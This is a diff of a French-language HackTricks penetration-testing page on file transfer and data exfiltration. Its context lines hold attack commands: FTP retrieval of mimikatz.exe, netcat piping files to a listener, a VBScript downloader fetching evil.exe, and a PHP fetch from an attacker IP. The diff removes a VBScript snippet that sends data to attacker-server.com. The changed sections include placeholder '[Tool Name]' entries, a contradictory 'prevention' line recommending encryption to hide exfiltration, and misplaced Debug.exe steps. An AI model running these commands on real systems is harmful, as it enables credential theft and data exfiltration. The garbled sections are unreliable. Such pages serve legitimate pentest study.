@@ -10,17 +10,9 @@ Autres façons de soutenir HackTricks :
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
 
 ## Domaines couramment autorisés pour exfiltrer des informations
 
@@ -62,7 +54,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Télécharger des fichiers
+### Téléverser des fichiers
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -161,14 +153,6 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## SMB
 
 Kali en tant que serveur
@@ -199,31 +183,26 @@ service smbd restart
 
 ### Exfiltration Over Command and Control Channel
 
-- **Description:** Exfiltrating data over the command and control channel used by the malware.
-- **Detection:** Monitor network traffic for unusual patterns or connections to known malicious IP addresses.
-- **Prevention:** Implement network segmentation to restrict communication channels for malware.
+- **Description:** Exfiltrating data over the command and control channel established by the attacker.
+- **Detection:** Monitor network traffic for unusual patterns or data leaving the network.
+- **Prevention:** Implement network segmentation and access controls to limit communication channels.
 
 ### Exfiltration Over Alternative Protocol
 
-- **Description:** Using alternative protocols such as DNS or ICMP to exfiltrate data.
-- **Detection:** Analyze network traffic for suspicious use of non-standard protocols.
-- **Prevention:** Implement deep packet inspection to detect and block exfiltration attempts.
+- **Description:** Exfiltrating data using protocols not commonly monitored by security tools.
+- **Detection:** Use deep packet inspection to analyze network traffic for suspicious activities.
+- **Prevention:** Employ encryption and tunneling to obfuscate exfiltrated data.
 
-### Exfiltration Over Encrypted Channels
+### Exfiltration Over Unencrypted Protocols
 
-- **Description:** Encrypting exfiltrated data to evade detection.
-- **Detection:** Monitor for high volumes of encrypted traffic leaving the network.
-- **Prevention:** Implement SSL/TLS inspection to decrypt and inspect encrypted traffic.
+- **Description:** Sending data over unencrypted protocols such as HTTP or FTP.
+- **Detection:** Monitor network traffic for plaintext data being transmitted.
+- **Prevention:** Enforce the use of encrypted communication protocols to protect data in transit.
 
 ## Tools
 
-- **[Tool Name](#)**: Description of the tool and how it can be used for exfiltration.
-- **[Tool Name](#)**: Description of the tool and how it can be used for exfiltration.
-
-## Resources
-
-- **[Resource Name](#)**: Description of the resource and how it can help in understanding exfiltration techniques.
-- **[Resource Name](#)**: Description of the resource and how it can help in understanding exfiltration techniques.
+- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
+- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -246,32 +225,6 @@ sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
-
-### Exfiltration
-
-Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data, including:
-
-- **Exfiltration Over Command and Control Channel**: Attackers can use the existing command and control channel to exfiltrate data from the target system.
-
-- **Exfiltration Over Alternative Protocol**: Attackers can use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data in a covert manner.
-
-- **Exfiltration Over Unencrypted Protocols**: Attackers can exfiltrate data over unencrypted protocols such as HTTP or FTP.
-
-- **Exfiltration Over Encrypted Protocols**: Attackers can exfiltrate data over encrypted protocols such as HTTPS or SSH to avoid detection.
-
-- **Exfiltration Using Steganography**: Attackers can hide data within images, audio files, or other digital media to exfiltrate information without detection.
-
-- **Exfiltration Using Covert Channels**: Attackers can use covert channels to exfiltrate data, such as encoding data within DNS queries or using timing channels.
-
-- **Exfiltration Using Data Compression**: Attackers can compress data before exfiltrating it to minimize the amount of data transferred and avoid detection.
-
-- **Exfiltration Using Data Fragmentation**: Attackers can fragment data into smaller pieces and exfiltrate them individually to avoid detection.
-
-- **Exfiltration Using Encryption**: Attackers can encrypt exfiltrated data to prevent unauthorized access and maintain data confidentiality.
-
-- **Exfiltration Using Out-of-Band Communication**: Attackers can exfiltrate data using out-of-band communication channels, such as using a separate network connection or covert channel.
-
-Understanding the various exfiltration methods is crucial for detecting and preventing data exfiltration attempts during security assessments.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -346,18 +299,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 
 ### Exfiltration
 
-VBScript can be used to exfiltrate data from a compromised system. This can be achieved by sending data to an external server controlled by the attacker. The following code snippet demonstrates a simple exfiltration technique using VBScript:
-
-```vbscript
-Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-url = "http://attacker-server.com/data=" & data
-objXMLHTTP.open "GET", url, False
-objXMLHTTP.send
-```
-
-In this code snippet, the `data` variable contains the information to be exfiltrated. The script creates an XMLHTTP object, appends the data to the URL, sends a GET request to the attacker's server, and transmits the data.
-
-It is important to note that exfiltrating data using VBScript can be detected by security tools, so additional obfuscation techniques may be necessary to avoid detection.
+VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method, headers, and body, and then sending the request to the server. The server-side script can receive the data and store it in a file or database for later retrieval by the attacker. This technique can be used to exfiltrate sensitive information such as passwords, documents, or system configuration files.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -395,37 +337,30 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Le programme `debug.exe` permet non seulement l'inspection des binaires, mais a également la **capacité de les reconstruire à partir de l'hexadécimal**. Cela signifie qu'en fournissant un hexadécimal d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limite d'assemblage de fichiers jusqu'à 64 ko en taille**.
+Le programme `debug.exe` non seulement permet l'inspection des binaires, mais a également la **capacité de les reconstruire à partir de l'hexadécimal**. Cela signifie qu'en fournissant un hexadécimal d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limite d'assemblage de fichiers jusqu'à 64 ko en taille**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Ensuite, copiez-collez le texte dans le shell Windows et un fichier appelé nc.exe sera créé.
-
-* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+Ensuite, copiez-collez le texte dans le shell Windows et un fichier appelé nc.exe sera créé.
 
-Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez** 💬 le groupe Discord](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
